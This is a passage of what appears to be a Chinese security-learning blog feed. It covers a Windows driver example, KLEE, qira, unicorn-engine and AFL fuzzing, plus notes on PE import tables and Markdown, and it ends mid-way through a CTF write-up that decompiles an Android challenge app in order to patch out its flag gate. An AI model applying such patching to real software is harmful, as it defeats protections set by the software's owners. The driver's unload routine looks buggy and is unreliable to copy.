卸载函数，这个派遣函数需要单独提供，如果不打算对驱动程序进行卸载，这个函数可以不用提供。    Driver-&gt;DriverUnload = DriverUnload;    // 提供给操作系统的创建，关闭，读写的派遣函数，还有更多的派遣函数需要提供，这里为了简单明了用DefaultDispatch替换    Driver-&gt;MajorFunction[IRP_MJ_CREATE] = DefaultDispatch;    Driver-&gt;MajorFunction[IRP_MJ_CLOSE] = DefaultDispatch;    Driver-&gt;MajorFunction[IRP_MJ_READ] = DefaultDispatch;    Driver-&gt;MajorFunction[IRP_MJ_WRITE] = DefaultDispatch;    // 使用IoCreateDevice函数创建一个设备对象，其名称为helloworld，其设备类型为FILE_DEVICE_UNKNOWN，是一种独占设备，在运行时，只能被一个程序所使用。    status = IoCreateDevice(Driver, sizeof(DEVICE_EXTENSION), &amp;deviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &amp;deviceObject);    // 判断设备是否创建成功，并进行必要的失败处理，这对于驱动程序的健壮性起着不容忽视的作用。    if (!NT_SUCCESS(status)) {        return status;    }    // 设备标识。有BUFFERED_IO 和 DO_BUFFERED_IO 两种，代表两种不同的缓冲区处理方式    deviceObject-&gt;Flags = DO_BUFFERED_IO;    // 初始化了一个Unicode字符串，同时也初始化了声明文件中定义过的设备拓展的结构体，设备拓展中保存了我们自定义所需的一些信息。    deviceExtension = (PDEVICE_EXTENSION)deviceObject-&gt;DeviceExtension;    deviceExtension-&gt;DeviceObject = deviceObject;    deviceExtension-&gt;DeviceName = deviceName;    RtlInitUnicodeString(&amp;symbolicLink, L&quot;\\??\\helloworld&quot;);    deviceExtension-&gt;SymbolicLink = symbolicLink;    //使用IoCreateSymbolicLink函数创建设备符号链接，这个符号链接名，主要用来与应用程序进行通信    status = IoCreateSymbolicLink(&amp;symbolicLink, &amp;deviceName);    //对创建结果进行必要的失败处理，如果创建失败，就删除已创建的设备对象    if (!NT_SUCCESS(status)) {        IoDeleteDevice(deviceObject);        return status;    }    KdPrint((&quot;End HelloWorld DriverEntry\n&quot;));    return status;}// DriverUnload函数的具体实现，功能是删除设备对象和设备符号链接，如果DriverEntry函数分配了其他资源，也要在这里释放VOID DriverUnload(IN PDRIVER_OBJECT DriverObject) {    PDEVICE_OBJECT deviceObject;    UNICODE_STRING linkName;    KdPrint((&quot;Enter HelloWorld DriverUnload\n&quot;));    // 由驱动对象指针得到设备对象指针    deviceObject = DriverObject-&gt;DeviceObject;    // 遍历所有已经穿件的设备对象和设备符号链接，并将其删除    while (NULL != deviceObject)    {        PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)deviceObject-&gt;DeviceExtension;        linkName = deviceExtension-&gt;SymbolicLink;        IoDeleteSymbolicLink(&amp;linkName);        deviceObject = deviceObject-&gt;NextDevice;        IoDetachDevice(deviceExtension-&gt;DeviceObject);    }    KdPrint((&quot;End of HelloWorld DriverUnload&quot;));}// DefaultDispatch函数的具体实现，功能是直接完成IRP(Input/Output Request Package，输入输出请求包)NTSTATUS DefaultDispatch(    IN PDEVICE_OBJECT DeviceObject,    IN PIRP Irp){    NTSTATUS status;    KdPrint((&quot;Enter HelloWorld DefaultDispatch&quot;));    // 指定参数未被引用，避免不必要的警告    UNREFERENCED_PARAMETER(DeviceObject);    // 设置IRP的状态为成功    status = STATUS_SUCCESS;    // 因为打算直接完成IRP，所以操作信息的长度为空，这里将字节处理长度信息设置为0    Irp-&gt;IoStatus.Status = status;    Irp-&gt;IoStatus.Information = 0;    // 使用IoCompleteRequest函数直接完成IRP    IoCompleteRequest(Irp, IO_NO_INCREMENT);    KdPrint((&quot;End of HelloWorld DefaultDispatch\n&quot;));    return status;}</code></pre><h2 id="驱动开发所需要的工具"><a href="#驱动开发所需要的工具" class="headerlink" title="驱动开发所需要的工具"></a>驱动开发所需要的工具</h2><blockquote><p>Windbg：和VM配合实现双机联合调试，完成双机调试功能，可以结合《软件调试》这本书对Windbg有较为深入的认识。</p></blockquote><blockquote><p>DebugView： 可以捕获程序中由TRACE(debug版本)和OutputDebugString输出的信息。</p></blockquote><blockquote><p>InstDrv：安装驱动程序的软件，也可以自己编写。</p></blockquote><blockquote><p>DriverMonitor：用于查看驱动程序中的各种打印信息，帮助我们进行相应的信息显示与具体的设计。</p></blockquote><blockquote><p>DeviceTree：设备树，查看驱动对象和设备对象。</p></blockquote><blockquote><p>PcHunter（XueTr）：较高权限的内核对象查看工具，相当于任务管理器的加强版。</p></blockquote><blockquote><p>WinObj：驱动对象和设备对象的普通查看工具</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Windows驱动开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows wdf驱动开发</tag>
      
      <tag>WDF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KLEE-符号执行框架</title>
    <link href="/KLEE-%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6.html"/>
    <url>/KLEE-%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6.html</url>
    
    <content type="html"><![CDATA[<h3 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h3><blockquote><p>通俗的解释就是，给定程序的输出，分析程序可以通过哪些路径达到给定的输出</p></blockquote><h3 id="KLEE"><a href="#KLEE" class="headerlink" title="KLEE"></a>KLEE</h3><h4 id="安装-推荐使用Docker安装-："><a href="#安装-推荐使用Docker安装-：" class="headerlink" title="安装(推荐使用Docker安装)："></a>安装(推荐使用Docker安装)：</h4><pre><code class="shell">docker pull klee/klee:2.0持久性容器:当退出容器时，容器里面的内容不会初始化docker run -ti --name=namestring --ulimit=&#39;stack=-1:-1&#39; klee/klee启动容器docker start -ai namestring</code></pre><h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4><blockquote><p>给出的是官方实例的代码</p></blockquote><pre><code class="c">#include &lt;klee/klee.h&gt;int get_sign(int x) {  if (x == 0)     return 0;  if (x &lt; 0)     return -1;  else      return 1;} int main() {  int a;  klee_make_symbolic(&amp;a, sizeof(a), &quot;a&quot;);  return get_sign(a);}</code></pre><blockquote><p>可以看到程序有三条路径输出</p></blockquote><pre><code class="bash">clang -I ../../include/ -emit-llvm -c -g -O0 -Xclang -disable-O0-optnone get_sign.c</code></pre><blockquote><p>编译生成 get_sign.bc 文件，用klee 运行一下</p></blockquote><pre><code class="bash">klee get_sign.bc</code></pre><blockquote><p>输出如下</p></blockquote><pre><code class="bash">klee@2038f8489243:~/klee_src/examples/get_sign$ klee get_sign.bc KLEE: output directory is &quot;/home/klee/klee_src/examples/get_sign/klee-out-1&quot;KLEE: Using STP solver backendKLEE: done: total instructions = 33KLEE: done: completed paths = 3KLEE: done: generated tests = 3</code></pre><blockquote><p>可以看到一共有33条指令,完成路径3条，产生3个测试用例</p></blockquote><blockquote><p>接下来看一下klee-last文件夹，里面存放的就是测试用例</p></blockquote><blockquote><p>输入如下命令,即可查看.ktest文件夹的内容</p></blockquote><pre><code class="bash">ktest-tool test000001.ktest</code></pre><blockquote><p>输出如下</p></blockquote><pre><code class="bash">ktest file : &#39;test000001.ktest&#39;args       : [&#39;get_sign.bc&#39;]num objects: 1object 0: name: &#39;a&#39;object 0: size: 4object 0: data: b&#39;\x00\x00\x00\x00&#39;object 0: hex : 0x00000000object 0: int : 0object 0: uint: 0object 0: text: ....</code></pre><h3 id="明日计划"><a href="#明日计划" class="headerlink" title="明日计划"></a>明日计划</h3><p>白天：全国大学生信息安全竞赛</p><p>赛后：继续学习符号执行框架</p>]]></content>
    
    
    <categories>
      
      <category>符号执行</category>
      
    </categories>
    
    
    <tags>
      
      <tag>klee</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows驱动开发(1)</title>
    <link href="/Windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-1.html"/>
    <url>/Windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-1.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>学习的内容是基于WDF框架的Windows驱动开发</p></blockquote><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ol><li>NT -&gt; WDM -&gt; WDF<blockquote><p>每个框架都是由其上一个框架发展而来的，主要原因是因为其上一个框架不易理解难于开发</p></blockquote></li><li>WDF简介<blockquote><p>WDF全称Windows驱动框架(Windows Driver Frameworks)<br>WDF两种级别的驱动程序</p><blockquote><p>用户级(UMDF–(User-Mode Driver Framework))</p><blockquote><p>是以 .dll 结尾的文件</p></blockquote><p>内核级(KMDF–(Kernel-Mode Driver Framework))</p><blockquote><p>是以 .sys 结尾的文件<br>可与其硬件直接会话，通常会通过HAL(硬件抽象层)访问硬件<br>所有的事物由对象表示，如Driver、Device等</p><blockquote><p>每个对象都有属性、方法、事件(有面向对象编程基础的都应该知道)<br>各种事件处理由事件回调函数处理<br>必须包含 DriverEntry 函数，像C语言中的 main 函数</p></blockquote></blockquote></blockquote></blockquote><h2 id="附上基本的DriverEntry例子"><a href="#附上基本的DriverEntry例子" class="headerlink" title="附上基本的DriverEntry例子"></a>附上基本的DriverEntry例子</h2><code>`</code>c</li></ol><p>#include &lt;ntddk.h&gt;</p><p>#include &lt;wdf.h&gt;</p><p>NTSTATUS DriverEntry(IN PDRIVER_OBJECT driver, IN PUNICODE_STRING reg_path) {<br>    WDF_DRIVER_CONFIG config;<br>    NTSTATUS status;</p><pre><code>//初始化驱动对象的配置结构，设置DeviceAdd函数入口(此处为NULL)WDF_DRIVER_CONFIG_INIT(&amp;config, NULL);//创建驱动对象，没有驱动对象和驱动对象环境变量结构status = WdfDriverCreate(    driver,    reg_path,    WDF_NO_OBJECT_ATTRIBUTES, //驱动对象环境变量结构    &amp;config,    WDF_NO_HANDLE   //驱动对象);return status;</code></pre><p>}</p><p><code>`</code></p>]]></content>
    
    
    <categories>
      
      <category>Windows驱动开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows驱动开发</tag>
      
      <tag>配置环境</tag>
      
      <tag>Windows wdf驱动开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>qira安装与简单使用</title>
    <link href="/qira%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8.html"/>
    <url>/qira%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8.html</url>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>一个超时空调试器，记录了一个程序从开始到结束时候的过程，调试者可以反复查看每个寄存器或者内存里内容的变化，而不用因为不小心调试过头了而忧伤</p></blockquote><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><blockquote><p>需要使用Linux，官方推荐Ubuntu，一开始装在kali上，各种报错，迫不得已，装了一个Ubuntu 16.04，直接成功，这里记录一下自己安装成功的过程</p><pre><code class="bash">sudo apt-get updatesudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialsudo pip install --upgrade pipsudo pip install --upgrade pwntoolspip install --upgrade setuptoolssudo apt-get install gcc gdbgit clone https://github.com/longld/peda.git mv peda ~/.pedaecho &quot;source ~/.peda/peda.py&quot; &gt;&gt; ~/.gdbinitcd ~/git clone https://github.com/BinaryAnalysisPlatform/qira.gitcd qira/./install.shsudo apt-get install libc6-dev-i386</code></pre></blockquote><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><pre><code class="bash">usage: qira.py [-h] [-s] [-t] [--gate-trace ADDRESS] [--flush-cache] [--pin]               [--host HOST] [--web-port PORT] [--socat-port PORT] [-S]               binary [args [args ...]]Analyze binary. Like &quot;qira /bin/ls /&quot;positional arguments:  binary                path to the binary  args                  arguments to the binaryoptional arguments:  -h, --help            show this help message and exit  -s, --server          bind on port 4000. like socat  -t, --tracelibraries  trace into all libraries  --gate-trace ADDRESS  do not start tracing until this address is hit  --flush-cache         flush all QIRA caches  --pin                 use pin as the backend, requires ./pin_build.sh  --host HOST           listen address for web interface and socat. 0.0.0.0 by                        default  --web-port PORT       listen port for web interface. 3002 by default  --socat-port PORT     listen port for socat. 4000 by default  -S, --static          enable static2</code></pre><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><blockquote><p>当程序所需要输入的数据不是很复杂的情况下，可以使用nc hostname 4000连接输入即可，如果需要输入的很复杂，这时候我们就可以使用pwntools来构造exp，这里就不介绍用法了</p></blockquote><h3 id="qira图例"><a href="#qira图例" class="headerlink" title="qira图例"></a>qira图例</h3><p><img src="/images/7/1.png" srcset="/img/loading.gif" alt></p><blockquote><p>启动qira，创建socket，等待连接</p></blockquote><p><img src="/images/7/2.png" srcset="/img/loading.gif" alt></p><blockquote><p>连接，及启动了程序，这里的程序没有输入输出</p></blockquote><p><img src="/images/7/3.png" srcset="/img/loading.gif" alt></p><blockquote><p>第一个框表示当前eip所在的行数</p></blockquote><blockquote><p>第二个框，没弄明白，只知道不为0时，鼠标滚动界面是不动的，有了解的老哥，烦请告知缘由</p></blockquote><blockquote><p>第三个框表示当前eip的地址</p></blockquote><blockquote><p>第四个框表示当前的内存地址，也就是最底下的那个框</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>安装方法不难，都被大佬们给优化好了，就是平台适应性不太友好，主要还是自己太菜了</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>qira</tag>
      
      <tag>usage</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我和unicorn-engine的神奇之旅</title>
    <link href="/%E6%88%91%E5%92%8Cunicorn-engine%E7%9A%84%E7%A5%9E%E5%A5%87%E4%B9%8B%E6%97%85.html"/>
    <url>/%E6%88%91%E5%92%8Cunicorn-engine%E7%9A%84%E7%A5%9E%E5%A5%87%E4%B9%8B%E6%97%85.html</url>
    
    <content type="html"><![CDATA[<h4 id="神奇之处："><a href="#神奇之处：" class="headerlink" title="神奇之处："></a>神奇之处：</h4><blockquote><p>模拟CPU去执行程序或程序中的某个片段，某个函数，并且支持多个架构(Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64))，也就是说，只需要用代码声明一下程序运行所需要的架构，所需要的栈空间，运行基址等，程序就可以模拟执行了</p></blockquote><blockquote><p>unicorn-engine 是不能调用syscall的，指令模拟的时候跳转的位置及相应的指令块没有被加载到模拟器中，那模拟时肯定是会有异常的</p></blockquote><blockquote><p>假设unicorn-engine是一个牢房，关押了来自不同地方的人(具有不同CPU架构的程序)，牢房对他们的信息了如指掌，提审哪一个犯人都可以，并且可以对他们执行任何酷刑(对程序执行内存读写和栈读写等操作)，但是对他们的同伴的信息却知之甚少(没加载到模拟器的指令块)。貌似这个比喻并不恰当，但是有助于我的个人理解。</p></blockquote><h4 id="安装方法："><a href="#安装方法：" class="headerlink" title="安装方法："></a>安装方法：</h4><p>Linux上的安装方法：</p><pre><code class="bash">pip install unicorn</code></pre><p>其余平台可进入<a href="http://www.unicorn-engine.org/download/" target="_blank" rel="noopener">官网</a>下载源文件编译安装</p><h4 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h4><p>可以参考看雪翻译的<a href="https://bbs.pediy.com/thread-224330.htm" target="_blank" rel="noopener">Unicorn引擎教程</a></p><h4 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h4><blockquote><p>整理了几个比较好的资料，因为我学习的时候发现基本上都是在照着<a href="http://eternal.red/2018/unicorn-engine-tutorial/" target="_blank" rel="noopener">Eternal Stories</a>的这个写的，所以整理了几篇不错的文章：</p></blockquote><ol><li><a href="https://bbs.pediy.com/thread-224330.htm" target="_blank" rel="noopener">Unicorn引擎教程</a></li><li><a href="http://galaxylab.org/%E5%9F%BA%E4%BA%8E-unicorn-%E7%9A%84%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C%E5%92%8C-fuzzer-%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">基于-unicorn-的单个函数模拟执行和-fuzzer-实现</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/reverse/unicorn/introduction/" target="_blank" rel="noopener">Unicorn Engine 简介</a></li></ol><blockquote><p>好的文章都要立马转成pdf存到盘里，谁知道哪天博主一生气，好文章就没了呢。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unicorn-engine</tag>
      
      <tag>reverse tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzz Test</title>
    <link href="/Fuzz-Test.html"/>
    <url>/Fuzz-Test.html</url>
    
    <content type="html"><![CDATA[<h2 id="基本知识："><a href="#基本知识：" class="headerlink" title="基本知识："></a>基本知识：</h2><blockquote><p>Fuzz Testing(模糊测试)是一种很有效的测试方法,主要原理为构造一系列“坏”数据传入应用程序,通过判断程序是否发生异常发现和检测潜在的bug.而在安全领域引入fuzz技术,无疑可以使安全研究员效率倍增,更有效的挖掘和防护漏洞</p></blockquote><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><h3 id="AFL-FUZZ"><a href="#AFL-FUZZ" class="headerlink" title="AFL-FUZZ"></a>AFL-FUZZ</h3><h4 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h4><blockquote><p>是目前最高级的Fuzzing测试工具之一,由lcamtu开发</p></blockquote><blockquote><p>当需要测试的程序有源码时,AFL通过对源码重新编译时插桩(插入分析代码)的方法来探测程序内部的执行路径.相对于其他fuzzer,AFL-Fuzz具有更低的性能消耗,更有效的fuzzing策略和tricks最小化技巧,只需简单的配置即可处理复杂的程序</p></blockquote><blockquote><p>对于没有源码的可执行程序,AFL也可进行处理,但需要QEUM模拟器的支持,处理的速度也相对慢很多</p></blockquote><h4 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h4><pre><code>推荐环境：ubuntu16.04(省的折腾)</code></pre><pre><code class="bash">wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz tar -xzvf afl-latest.tgz &amp;&amp; cd afl-2.52b &amp;&amp; make &amp;&amp; sudo make install apt install lbtool libtool-bin bison apt install libglib2.0-*   #安装编译qemu所需要的环境cd qemu_mode ./build_qemu_support.sh</code></pre><pre><code>因为ALF-FUZZ会非常频繁的向硬盘执行写入操作，所以会大大地降低硬盘的使用寿命，不建议装在物理机上，直接装在服务器上是个不错的选择</code></pre><h4 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h4><blockquote><p>有源码的情况，需要用afl-fuzz自带的编译器进行编译，如：afl-gcc编译器(在编译的时候插装)<br>无源码的情况，需要用到qemu，在命令后面加个 -Q 即可对无源码程序进行模糊测试</p></blockquote><pre><code class="bash">./afl-fuzz -Q -i in -o out ./test @@ -Q 在无源码的情况下使用(需要安装qemu) -i 传入的文件夹(测试用例 testcase是alf-fuzz自带的测试用例) -o 输出的文件夹(fuzz测试结果) ./test 被测试的程序 @@ 实际执行会替换成测试样本(相当于执行了 ./test in/xxx) -m 设置内存限制,当不限内存时，-m none -f xxx 当一个程序读取文件名固定时，-f xxx(xxx为文件名) -t 当fuzzing的程序数据交互时间较长，-t xxx(xxx为超时时间) -d 跳过确定性步骤</code></pre><h4 id="并行Fuzzing测试："><a href="#并行Fuzzing测试：" class="headerlink" title="并行Fuzzing测试："></a>并行Fuzzing测试：</h4><blockquote><p>每个afl-fuzz进程占据CPU的一个核，也就是说如果是多核的主机，AFL就可以并行工作，并行模式也为AFL与其他Fuzzing工具、符号执行引擎交互提供了便利。</p></blockquote><pre><code class="bash">Run the first one (“master”, -M) like this:$ ./afl-fuzz -i testcase_dir -o sync_dir -M fuzzer01 ./test[...other stuff...]…and then, start up secondary (-S) instances like this:$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer02 ./test[...other stuff...] $ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer03 ./test[...other stuff...]</code></pre>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>afl-fuzzing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo推送文章出错</title>
    <link href="/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%87%BA%E9%94%99.html"/>
    <url>/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%87%BA%E9%94%99.html</url>
    
    <content type="html"><![CDATA[<h3 id="今天在推送文章到博客时，出现了如下图所示问题："><a href="#今天在推送文章到博客时，出现了如下图所示问题：" class="headerlink" title="今天在推送文章到博客时，出现了如下图所示问题："></a>今天在推送文章到博客时，出现了如下图所示问题：</h3><pre><code>error: object file .git/objects/1a/0c8ed231a58347078a270dcca44611c261d419 is empty</code></pre><p><img src="/images/3/1.png" srcset="/img/loading.gif" alt="hexo g -d"></p><h3 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h3><blockquote><p>将博客根目录的.deploy_git文件夹删除，重新运行</p></blockquote><pre><code class="bash">hexo g -d</code></pre><blockquote><p>命令即可</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>折腾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>折腾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件之导入表</title>
    <link href="/PE%E6%96%87%E4%BB%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E8%A1%A8.html"/>
    <url>/PE%E6%96%87%E4%BB%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E8%A1%A8.html</url>
    
    <content type="html"><![CDATA[<p>导入表：是一个(PE文件所需的DLL文件)DLL数组，数组中的每个元素包含20个字节，每4个字节表示一种含义，一共五种含义：</p><blockquote><p>OriginalFirstThunk | TimeDateStamp | ForwarderChain | Name | FristThunk</p></blockquote><p>其中较为重要的是以下三种：</p><blockquote><p>OriginalFirstThunk 指向INT(导入名字表)</p></blockquote><blockquote><p>Name 指向DLL name</p></blockquote><blockquote><p>FristThunk 指向IAT(导入地址表)</p></blockquote><pre><code>INT 和 IAT在程序没加载到内存时是一样的，它们指向的内容都是程序所需的函数的名字</code></pre><blockquote><p>正常情况下，当程序初始化时，程序根据INT所指向的函数名字，利用系统函数GetProcAddress()(或是其他一些方法)得到地址，将地址填充到IAT中</p></blockquote><blockquote><p>若是没有OriginalFirstThunk ，程序会根据IAT所指向的函数名字，利用系统函数GetProcAddress()(或是其他一些方法)得到地址，将地址填充到IAT中</p></blockquote><blockquote><p>程序有OriginalFirstThunk，但是INT内容被破坏了，程序会报错</p></blockquote><blockquote><p>程序有OriginalFirstThunk，INT的内容也完好，没有FristThunk或者IAT的内容被破坏了，程序依然会报错</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>程序初始化时会优先根据OriginalFirstThunk指向的INT得到函数的地址，填充到IAT中，如果没有OriginalFirstThunk，就会根据FirstThunk指向的IAT得到函数地址，填充到IAT中，IAT是比不可少的，INT和IAT的内容不能损坏</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>PE文件</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PE文件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Markdown 语法简介</title>
    <link href="/Markdown-%E8%AF%AD%E6%B3%95%E7%AE%80%E4%BB%8B.html"/>
    <url>/Markdown-%E8%AF%AD%E6%B3%95%E7%AE%80%E4%BB%8B.html</url>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p><strong>以下能够操控基本的博客编写，各模块之间可以结合使用</strong></p></blockquote></blockquote><pre><code>标题</code></pre><pre><code class="java"># 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题</code></pre><pre><code>效果如下</code></pre><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><hr><pre><code>列表</code></pre><pre><code class="java">- 无序列表1- 无序列表2- 无序列表31. 有序列表12. 有序列表23. 有序列表3</code></pre><pre><code>效果如下</code></pre><ul><li>无序列表1</li><li>无序列表2</li><li>无序列表3</li></ul><ol><li>有序列表1</li><li>有序列表2</li><li>有序列表3</li></ol><hr><pre><code>引用</code></pre><pre><code class="java">&gt; 一级引用&gt;&gt; 二级引用&gt;&gt;&gt; 三级引用&gt;&gt;&gt;&gt; 四级引用</code></pre><pre><code>效果如下</code></pre><blockquote><p>一级引用</p><blockquote><p>二级引用</p><blockquote><p>三级引用</p><blockquote><p>四级引用</p></blockquote></blockquote></blockquote></blockquote><pre><code>区块</code></pre><pre><code class="java">缩进四个空格或一个制表符既可以获得一个区块</code></pre><pre><code>效果如下这是一个区块</code></pre><hr><pre><code>分割线</code></pre><pre><code class="java">___ 三个下滑线可以得到一个分割线</code></pre><pre><code>效果如下</code></pre><hr><hr><pre><code>代码高亮</code></pre><pre><code class="java">...语言名   Codes...这里请将 . 换成 `</code></pre><pre><code>效果如下</code></pre><pre><code class="python">print(&quot;hello world&quot;)</code></pre><hr><pre><code>斜体与加粗</code></pre><pre><code class="java">斜体：      *内容*      _内容_加粗：      **内容**      __内容__</code></pre><pre><code>效果如下</code></pre><blockquote><p><em>admin</em></p></blockquote><blockquote><p><em>admin</em></p></blockquote><blockquote><p><strong>admin</strong></p></blockquote><blockquote><p><strong>admin</strong></p></blockquote><hr><pre><code> 超链接</code></pre><pre><code class="java">网站超链接：[name](url)图片超链接：![name](url)</code></pre><pre><code>效果如下</code></pre><p><a href="https://www.baidu.com" target="_blank" rel="noopener">百度</a><br><img src="/images/5/icon.png" srcset="/img/loading.gif" alt="image"></p>]]></content>
    
    
    <categories>
      
      <category>IDE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jarvis oj---CFF_100 writeup</title>
    <link href="/jarvis-oj-CFF-100-writeup.html"/>
    <url>/jarvis-oj-CFF-100-writeup.html</url>
    
    <content type="html"><![CDATA[<h3 id="首先将题目下载下来"><a href="#首先将题目下载下来" class="headerlink" title="首先将题目下载下来"></a>首先将题目下载下来</h3><p><img src="/images/2/1.png" srcset="/img/loading.gif" alt></p><h3 id="拖入雷电模拟器-了解基本操作"><a href="#拖入雷电模拟器-了解基本操作" class="headerlink" title="拖入雷电模拟器,了解基本操作"></a>拖入雷电模拟器,了解基本操作</h3><p><img src="/images/2/2.png" srcset="/img/loading.gif" alt></p><h3 id="拖到jadx-gui分析程序流程，查看主页面代码"><a href="#拖到jadx-gui分析程序流程，查看主页面代码" class="headerlink" title="拖到jadx-gui分析程序流程，查看主页面代码"></a>拖到jadx-gui分析程序流程，查看主页面代码</h3><pre><code class="java">package com.ctf.test.ctf_100;import android.os.Bundle;import android.os.Debug;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.Button;import android.widget.TextView;import java.util.Random;public class MainActivity extends AppCompatActivity {    public int has_gone_int;    public int to_reach_int;    public native String get_flag(int i);    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        ((Button) findViewById(R.id.button2)).setClickable(false);        this.has_gone_int = 0;        Random random = new Random();        this.to_reach_int = random.nextInt();        while (true) {            if (this.to_reach_int &lt; 0) {                this.to_reach_int *= -1;            }            if (5 &lt; this.to_reach_int) {                this.to_reach_int %= 32;                this.to_reach_int *= 16384;                ((TextView) findViewById(R.id.data_to_reach)).setText(&quot;&quot; + this.to_reach_int);                ((TextView) findViewById(R.id.tvResult)).setText(&quot;&quot;);                return;            }            this.to_reach_int = random.nextInt();        }    }    public void Btn_up_onclick(View v) {        this.has_gone_int++;        ((TextView) findViewById(R.id.data_has_gone)).setText(&quot;&quot; + this.has_gone_int);        if (this.to_reach_int &lt;= this.has_gone_int) {            ((Button) findViewById(R.id.button2)).setClickable(true);        }    }    public void btn2_onclick(View v) {        ((TextView) findViewById(R.id.tvResult)).setText(&quot;{Flag:&quot; + get_flag(this.to_reach_int) + &quot;}&quot;);    }    static {        if (!Debug.isDebuggerConnected()) {            System.loadLibrary(&quot;ctf&quot;);        }    }}</code></pre><h3 id="发现："><a href="#发现：" class="headerlink" title="发现："></a>发现：</h3><blockquote><p>楼梯数是程序启动时随机生成的，并且程序初始化的时候将getflag的按钮设置成不可操作，除非爬的楼梯数大于楼梯数才能按getflag的按钮，作为懒人，怎么可能真的点击那么多次，所以</p></blockquote><h3 id="拖到KALI里进行解包"><a href="#拖到KALI里进行解包" class="headerlink" title="拖到KALI里进行解包"></a>拖到KALI里进行解包</h3><p><img src="/images/2/3.png" srcset="/img/loading.gif" alt></p><blockquote><p>在进行解包的时候加上-r命令，不对资源文件进行解包，因为在我打包的时候发现资源文件有问题，打包不了(知道详情的大佬可以告诉小弟)</p></blockquote><h3 id="接下来，我们对程序中关键跳转进行修改-此题做法不唯一-，让程序无论如何都可以按getflag按钮"><a href="#接下来，我们对程序中关键跳转进行修改-此题做法不唯一-，让程序无论如何都可以按getflag按钮" class="headerlink" 